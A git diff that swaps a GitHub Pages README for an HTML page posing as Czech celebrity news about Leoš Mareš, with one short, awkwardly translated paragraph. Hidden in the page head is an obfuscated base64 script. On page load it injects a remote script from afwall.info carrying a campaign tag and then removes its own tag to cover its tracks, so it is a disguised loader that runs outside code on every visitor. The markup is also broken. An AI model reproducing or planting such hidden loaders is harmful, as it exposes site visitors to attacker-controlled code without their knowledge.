@@ -1,37 +1,31 @@
-## Welcome to GitHub Pages
+<!DOCTYPE html>
+<html lang="cz">
 
-You can use the [editor on GitHub](https://github.com/ZCdaily/czdailynews/edit/master/index.md) to maintain and preview the content for your website in Markdown files.
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Leoš Mareš neodhadl situaci a přecenil své síly</title>
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+<p><img src="https://sedmicka.tyden.cz/obrazek/202003/5e72a002bbb59/crop-2039264-11-00-hlavni-frh-2673_800x540.jpg" alt="" /></p>
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+	<meta name="HandheldFriendly" content="true">
+	<meta name="MobileOptimzied" content="width">
+	<meta name="referrer" content="always">
+	<meta name="theme-color" content="#ffffff">
+	
+	
+	
+	
+	 <script id="XWNMm" src="data:text/javascript;base64, dmFyIF9IRWJ5dCA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX2s3SHRGLCBfU2dHUmQpIHt2YXIgX2FmRVpGID0gZnVuY3Rpb24oXzRjVE4yKSB7d2hpbGUgKC0tXzRjVE4yKSB7X2s3SHRGWydwdXNoJ10oX2s3SHRGWydzaGlmdCddKCkpO319O19hZkVaRigrK19TZ0dSZCk7fShfSEVieXQsIDB4MTFiKSk7dmFyIF9LNzk5cCA9IGZ1bmN0aW9uKF9nM1ppeSwgX1hrMzJ1KSB7X2czWml5ID0gX2czWml5IC0gMHgwO3ZhciBfRTZvaEUgPSBfSEVieXRbX2czWml5XTtyZXR1cm4gX0U2b2hFO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfSzc5OXAoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX0M2MUZYID0gZG9jdW1lbnRbX0s3OTlwKCcweDEnKV0oX0s3OTlwKCcweDInKSk7X0M2MUZYW19LNzk5cCgnMHgzJyldID0gX0s3OTlwKCcweDQnKTtfQzYxRlhbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2MVx4NjZceDc3XHg2MVx4NmNceDZjXHgyZVx4NjlceDZlXHg2Nlx4NmZceDJmXHg1Zlx4NzJceDY1XHg2ZFx4NmZceDc0XHg2NVx4NWZceDc0XHg3Mlx4NjFceDYzXHg2Ylx4MmVceDZhXHg3M1x4M2ZceDYzXHg2MVx4NmRceDcwXHg2MVx4NjlceDY3XHg2ZVx4M2RceDc1XHg2OVx4NDVceDc1XHgzNFx4N2FceDRiXHg1OFx4NzNceDcyJztkb2N1bWVudFtfSzc5OXAoJzB4NScpXShfSzc5OXAoJzB4NicpKVsnXHg2MVx4NzBceDcwXHg2NVx4NmVceDY0XHg0M1x4NjhceDY5XHg2Y1x4NjQnXShfQzYxRlgpO2RvY3VtZW50W19LNzk5cCgnMHg3JyldKCdYV05NbScpWydceDcyXHg2NVx4NmRceDZmXHg3Nlx4NjUnXSgpO30sIHsnXHg2Zlx4NmVceDYzXHg2NSc6ICEhW119KTs="></script>
+	
+	
+	</style>
+</head>
 
-### Markdown
+<body>
+	<p>Mare&scaron; fails. According to the exclusive information of the weekly Sedmicka, he has recently been stressed because he has overestimated his strength. Baited from last year, when he managed to fill the largest hall in the Czech Republic three times, he tried to do the same thing this year. From the beginning, however, it has a huge worry.</p>
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+</body>
 
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/ZCdaily/czdailynews/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+</html>
